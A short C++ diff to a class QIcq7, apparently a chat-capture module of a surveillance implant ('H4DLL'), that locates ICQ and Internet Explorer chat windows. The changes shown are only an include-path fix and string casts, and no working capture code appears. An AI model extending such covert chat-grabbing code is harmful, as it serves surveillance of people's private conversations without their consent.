@@ -12,13 +12,13 @@
 using namespace std;
 
 #include "QIcq7.h"
-#include "..\common.h"
+#include "../../H4DLL/common.h"
 #define MIN_SEARCH_LENGTH 200
 
 // XXX - DA FARE
 PWCHAR QIcq7::wChatTree[] = {
-	L"__oxFrame.class__",
-	L"Internet Explorer_Server",
+	(PWCHAR)L"__oxFrame.class__",
+	(PWCHAR)L"Internet Explorer_Server",
 	0
 };
 
@@ -91,7 +91,7 @@ BOOL QIcq7::GrabTopic()
 */
 BOOL QIcq7::GrabUserList()
 {
-	properties.SetUsers(L"");
+	properties.SetUsers((PWCHAR)L"");
 	return FALSE;
 }
 
